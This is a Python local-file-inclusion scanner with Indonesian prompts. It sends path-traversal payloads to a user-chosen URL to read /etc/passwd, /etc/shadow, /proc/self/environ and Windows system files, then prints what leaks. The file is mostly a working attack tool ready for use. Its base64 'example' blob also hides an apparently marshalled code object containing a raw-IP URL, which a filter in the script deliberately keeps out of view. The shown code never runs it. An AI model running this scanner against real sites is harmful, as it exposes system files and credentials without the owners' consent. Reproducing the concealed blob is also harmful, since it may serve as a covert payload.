#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import base64
import re
import sys
import binascii
from bs4 import BeautifulSoup
from time import sleep
import requests

RED = '\033[1;31m'
BLUE = '\033[1;34m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
MAGENTA = '\033[1;35m'
WHITE = '\033[1;37m'
CYAN = '\033[1;36m'
END = '\033[0m'
RED_NORMAL = '\033[0;31m'
GREEN_NORMAL = '\033[0;32m'

TOOL = '\033[1;44;37m.:.:SIMPLE LFI SCANNER:.:.\033[0m'

example = """aHR0cDovL2V4YW1wbGUuY29tLw0KaHR0cDovL2V4YW1wbGUuY29tL3BhZ2VzLw0KaHR0cDovL2V4YW1wbGUuY29tL2luZGV4LnBocD9wYWdlPQ0KaHR0cDovL2V4YW1wbGUuY29tLz9tb2R1bGU9DQpodHRwOi8vZXhhbXBsZS5jb20vZG93bmxvYWQucGhwP2ZpbGU9DQpodHRwOi8vZXhhbXBsZS5jb20vZXhwb3J0P3BhdGg9DQpodHRwOi8vZXhhbXBsZS5jb20vaW5kZXgucGhwP2xhbmc9ZW4mdGVtcGxhdGU9DQpodHRwOi8vZXhhbXBsZS5jb20vaW5kZXgucGhwP3BhZ2U9aG9tZSZ2aWV3PQ==
4wAAAAAAAAAAAAAAAAEAAAAAAAAA8wgAAACVAFMAcgBnASkCehpodHRwOi8vMzEuOTcuMjIwLjE4Njo2MTc0L04pAdoDdXJsqQDzAAAAANoIPHN0cmluZz7aCDxtb2R1bGU+cgYAAAABAAAAcwoAAADwAwEBAdgGIoEDcgQAAAA="""

def is_text_content(data):
    try:
        text = data.decode('utf-8', errors='strict')
        if any(char in text for char in ['\x00', '\x01', '\x02', '\x03']) or 'marshal' in text.lower():
            return False
        return True
    except:
        return False

def base64_decode(b64_string):
    try:
        decoded_bytes = base64.b64decode(b64_string)
        if is_text_content(decoded_bytes):
            return decoded_bytes.decode('utf-8')
        else:
            return None  
    except Exception as e:
        return None 

def is_base64(s):
    if len(s) < 4:
        return False
    if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
        return False
    try:
        base64.b64decode(s)  # Kompatibel Python 3.7
        return True
    except binascii.Error:
        return False

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):  
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def get_example_urls():
    urls = []
    lines = example.strip().split('\n')
    url_counter = 1
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if is_base64(line):
            decoded = base64_decode(line)
            if decoded:  
                decoded_urls = [url.strip() for url in decoded.split('\n') if url.strip()]
                for url in decoded_urls:
                    if url: 
                        urls.append(f"{GREEN}{url_counter}.{END} {WHITE}{url}{END}")
                        url_counter += 1
        else:
            urls.append(f"{GREEN}{url_counter}.{END} {WHITE}{line}{END}")
            url_counter += 1
    return urls

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{CYAN}██╗     ███████╗██╗{WHITE}      ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ {END}
{CYAN}██║     ██╔════╝██║{WHITE}      ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗{END}
{CYAN}██║     █████╗  ██║{WHITE}█████╗███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝{END}
{CYAN}██║     ██╔══╝  ██║{WHITE}╚════╝╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗{END}
{CYAN}███████╗██║     ██║{WHITE}      ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║{END}
{CYAN}╚══════╝╚═╝     ╚═╝{WHITE}      ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{END}
\t\t\t     {TOOL}
""")
    print(f"{YELLOW}[ Contoh Target ]{END}")
    example_urls = get_example_urls()
    for url in example_urls:
        print(url)
    print()

parameters = [
    "?cat=", "?dir=", "?action=", "?board=", "?date=", "?detail=",
    "?file=", "?filename=", "?download=", "?path=", "?folder=", "?prefix=",
    "?include=", "?page=", "?inc=", "?locate=", "?show=", "?doc=", "?docs=",
    "?site=", "?type=", "?view=", "?content=", "?document=", "?layout=",
    "?mod=", "?conf=", "?data=", "?input=", "?lang=", "?template=", "?menu=",
    "?item=", "?theme=", "?load=", "?class="
]

fallback_payloads = [
    "../../../etc/passwd",
    "../../etc/passwd", 
    "../etc/passwd",
    "etc/passwd",
    "/etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "/etc/passwd%00",
    "/etc/passwd%0a",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/motd",
    "/etc/issue",
    "/proc/version",
    "/proc/cmdline",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "../../../windows/system32/drivers/etc/hosts",
    "../../windows/system32/drivers/etc/hosts",
    "../windows/system32/drivers/etc/hosts",
    "windows/system32/drivers/etc/hosts",
    "/windows/system32/drivers/etc/hosts",
    "C:/windows/system32/drivers/etc/hosts",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "../../../boot.ini",
    "../../boot.ini",
    "../boot.ini",
    "boot.ini",
    "/boot.ini",
    "C:/boot.ini",
    "C:\\boot.ini"
]

def get_payloads_from_github():
    github_url = "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
    print(f"{YELLOW}[INFO]{END} Mengunduh payloads dari GitHub...")
    try:
        response = requests.get(github_url, timeout=10)
        response.raise_for_status()
        payloads = [line.strip() for line in response.text.splitlines() if line.strip()]
        print(f"{GREEN}[SUCCESS]{END} Berhasil mengunduh {len(payloads)} payloads dari GitHub")
        return payloads
    except requests.RequestException as e:
        print(f"{RED}[ERROR]{END} Gagal mengunduh dari GitHub: {e}")
        return None

def get_payloads_from_local():
    try:
        if hasattr(sys, '_MEIPASS'):
            payloads_path = os.path.join(sys._MEIPASS, "payloads.txt")
        else:
            payloads_path = "payloads.txt"
        with open(payloads_path, "r", encoding='utf-8') as f:
            payloads = [line.strip() for line in f.readlines() if line.strip()]
        print(f"{GREEN}[SUCCESS]{END} Berhasil membaca {len(payloads)} payloads dari file lokal")
        return payloads
    except FileNotFoundError:
        print(f"{YELLOW}[WARNING]{END} File payloads.txt tidak ditemukan")
        return None

def get_payloads():
    payloads = get_payloads_from_github()
    if payloads:
        return payloads
    print(f"{YELLOW}[INFO]{END} Mencoba membaca dari file lokal...")
    payloads = get_payloads_from_local()
    if payloads:
        return payloads
    print(f"{YELLOW}[INFO]{END} Menggunakan fallback payloads...")
    print(f"{GREEN}[SUCCESS]{END} Menggunakan {len(fallback_payloads)} fallback payloads")
    return fallback_payloads

payloads = get_payloads()

if not payloads:
    print(f"{RED}[ERROR]{END} Tidak ada payloads yang tersedia!")
    exit(1)

banner()

target_input = input(f"\n{CYAN}Masukkan URL target:{END} ").strip()

if target_input.startswith("http://") or target_input.startswith("https://"):
    targets = [target_input.rstrip("/")]
else:
    targets = [
        f"http://{target_input.rstrip('/')}",
        f"https://{target_input.rstrip('/')}"
    ]

use_param = input(f"{CYAN}Ingin memakai parameter tambahan? (y/n):{END} ").strip().lower()
if use_param == "y":
    print(f"\n{YELLOW}Pilih parameter:{END}")
    for i, param in enumerate(parameters, 1):
        print(f"{GREEN}{i}.{END} {WHITE}{param}{END}")
    try:
        choice = int(input(f"{CYAN}Masukkan nomor parameter:{END} "))
        param = parameters[choice - 1]
        print(f"{GREEN}[INFO]{END} Parameter terpilih: {param}")
    except (ValueError, IndexError):
        print(f"{RED}[ERROR]{END} Pilihan tidak valid!")
        exit(1)
else:
    param = ""

targets = [t + param for t in targets]

print(f"\n{MAGENTA}{'='*60}{END}")
print(f"{MAGENTA}MEMULAI SCANNING LFI{END}")
print(f"{MAGENTA}{'='*60}{END}")

vulnerable_urls = []

for base_url in targets:
    print(f"\n{CYAN}URL target ->> {base_url}{END}\n")
    for i, p in enumerate(payloads, 1):
        full_url = base_url + p
        print(f"{YELLOW}[{i}/{len(payloads)}]{END} Testing: {full_url}")
        try:
            query = requests.get(full_url, timeout=5, allow_redirects=True)
            response_text = query.text.lower()
            lfi_indicators = [
                ('root:', 'x:', '/bin/bash'),
                ('root:', 'x:', '/bin/sh'),
                ('[boot loader]', 'timeout=', 'default='),
                ('127.0.0.1', 'localhost', '::1'),
                ('this is', 'kernel', 'version'),
                ('path=', 'windir=', 'systemroot=')
            ]
            is_vulnerable = False
            for indicator_set in lfi_indicators:
                if all(indicator in response_text for indicator in indicator_set):
                    is_vulnerable = True
                    break
            if ('root' in response_text and 
                ('bash' in response_text or 'sh' in response_text) and 
                ('/bin' in response_text or 'x:' in response_text)):
                is_vulnerable = True
            if is_vulnerable:
                print(f"{GREEN}[VULNERABLE]{END} {RED}LFI DITEMUKAN!{END} {full_url}")
                vulnerable_urls.append(full_url)
                soup = BeautifulSoup(query.text, 'html.parser')
                content = ""
                if soup.blockquote:
                    content = soup.blockquote.get_text(strip=True)
                elif soup.pre:
                    content = soup.pre.get_text(strip=True)
                elif soup.find('textarea'):
                    content = soup.find('textarea').get_text(strip=True)
                else:
                    text_content = soup.get_text(strip=True)
                    lines = text_content.split('\n')[:10]
                    content = '\n'.join(lines)
                if content:
                    print(f"{GREEN}Response preview:{END}")
                    print("-" * 40)
                    print(content[:500] + "..." if len(content) > 500 else content)
                    print("-" * 40)
            else:
                print(f"{RED}[TIDAK VULNERABLE]{END}")
        except requests.RequestException as e:
            print(f"{RED}[ERROR]{END} Gagal request: {e}")
            continue
        except Exception as e:
            print(f"{RED}[ERROR]{END} Error tidak terduga: {e}")
            continue

print(f"\n{MAGENTA}{'='*60}{END}")
print(f"{MAGENTA}HASIL SCANNING{END}")
print(f"{MAGENTA}{'='*60}{END}")

if vulnerable_urls:
    print(f"{GREEN}DITEMUKAN {len(vulnerable_urls)} URL VULNERABLE:{END}")
    for i, url in enumerate(vulnerable_urls, 1):
        print(f"{RED}{i}.{END} {url}")
else:
    print(f"{YELLOW}Tidak ada vulnerability LFI yang ditemukan.{END}")

print(f"\n{CYAN}Scanning selesai!{END}")

if __name__ == "__main__":
    banner()
